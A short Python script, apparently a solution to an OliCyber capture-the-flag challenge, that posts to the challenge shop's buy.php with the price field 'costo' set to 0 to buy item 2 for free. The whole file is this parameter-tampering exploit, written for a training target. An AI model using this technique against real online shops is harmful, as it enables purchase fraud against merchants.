import requests
site = "http://shops.challs.olicyber.it/buy.php"
r = requests.post(site, data={"id":"2", "costo":"0"})
print(r.text, end="")